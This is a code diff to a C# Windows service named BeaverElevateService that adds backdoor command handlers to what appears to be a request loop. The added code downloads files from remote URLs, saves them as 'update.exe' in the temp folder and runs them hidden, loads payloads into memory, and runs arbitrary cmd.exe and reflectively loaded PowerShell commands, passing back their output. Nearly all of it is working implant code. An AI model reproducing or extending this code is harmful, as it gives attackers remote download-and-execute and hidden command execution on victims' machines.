@@ -9,6 +9,9 @@ using System.Net;
 using System.Threading.Tasks;
 using System.Reflection;
 using System.Runtime.InteropServices;
+using System.Collections;
+using System.Linq;
+using System.Threading;
 
 namespace BeaverElevateService
 {
@@ -60,7 +63,7 @@ namespace BeaverElevateService
                             }
                             catch { }
                         }
-                        else if (request.Contains("DownExec"))
+                        else if (request.Contains("invoke"))
                         {
                             try
                             {
@@ -68,16 +71,114 @@ namespace BeaverElevateService
                                 string url = args[1];
                                 string cleanurl = url.Remove(url.Length - 2);
                                 Task.Run(() => ExecuteInMemory(cleanurl));
+                                //ExecuteInMemory(cleanurl);
+                            }
+                            catch {
+                                Console.WriteLine("Error running ExecuteInMemory()");
+                            }
+                        }
+                        else if (request.Contains("download"))
+                        {
+                            try
+                            {
+                                var args = request.Split(' ');
+                                string url = args[1];
+                                string cleanurl = url.Remove(url.Length - 2);
+                                Task.Run(() => ExecuteOnDisk(cleanurl));
+                                //ExecuteOnDisk(cleanurl);
+                            }
+                            catch {
+                                Console.WriteLine("Error running ExecuteOnDisk()");
+                            }
+                        }
+                        else if (request.Contains("cmd"))
+                        {
+                            try
+                            {
+                                string incmd = request.Replace("cmd ", "");
+                                string args = incmd.Remove(incmd.Length - 2);
+
+                                ProcessStartInfo startInfo = new ProcessStartInfo();
+                                startInfo.FileName = "C:\\Windows\\System32\\cmd.exe";
+                                startInfo.Arguments = args;
+                                startInfo.UseShellExecute = false;
+                                startInfo.RedirectStandardOutput = true;
+                                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+
+                                Thread thread = new Thread(() =>
+                                {
+                                    using (Process process = new Process())
+                                    {
+                                        process.StartInfo = startInfo;
+                                        process.Start();
+                                        process.WaitForExit();
+                                        if (startInfo.RedirectStandardOutput)
+                                        {
+                                            // Read the output from the process and write it back up the namedpipe
+                                            string output = process.StandardOutput.ReadToEnd();
+                                            Console.Out.WriteLine(output);
+                                        }
+                                    }
+                                });
+
+                                thread.Start();
                             }
                             catch { }
                         }
-                        else if (request == "chaos")
+                        else if (request.Contains("pwsh"))
                         {
+                            try
+                            {
+                                string inscript = request.Replace("pwsh ", "");
+                                string script = inscript.Remove(inscript.Length - 2);
 
+                                Assembly assembly = Assembly.Load("System.Management.Automation");
+                                Type powerShellType = assembly.GetType("System.Management.Automation.PowerShell");
+                                object powerShellInstance = Activator.CreateInstance(powerShellType);
+                                MethodInfo addScriptMethod = powerShellType.GetMethod("AddScript", new Type[] { typeof(string) });
+                                addScriptMethod.Invoke(powerShellInstance, new object[] { script });
+                                MethodInfo invokeMethod = powerShellType.GetMethod("Invoke");
+                                object result = invokeMethod.Invoke(powerShellInstance, null);
+                                foreach (var item in (IEnumerable)result)
+                                {
+                                    Console.Out.WriteLine(item);
+                                }
+                            }
+                            catch { }
                         }
                         else { }
                     }
                 }
+            }
+        }
+
+        static void ExecuteOnDisk(string downloadLink)
+        {
+            try
+            {
+                string tempFilePath = Path.Combine(Path.GetTempPath(), "update.exe");
+                WebClient webClient = new WebClient();
+                Console.WriteLine($"Downloading {downloadLink} to {tempFilePath}...");
+                byte[] fileBytes = webClient.DownloadData(downloadLink);
+                File.WriteAllBytes(tempFilePath, fileBytes);
+                Console.WriteLine("Executing the file...");
+
+                ProcessStartInfo startInfo = new ProcessStartInfo();
+                startInfo.FileName = tempFilePath;
+                startInfo.UseShellExecute = false;
+                startInfo.RedirectStandardOutput = true;
+                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                using (Process process = new Process())
+                {
+                    process.StartInfo = startInfo;
+                    process.Start();
+                    //process.WaitForExit();
+                }
+
+            }
+            catch
+            {
+                Console.WriteLine("Failed to download and execute!");
             }
         }
 
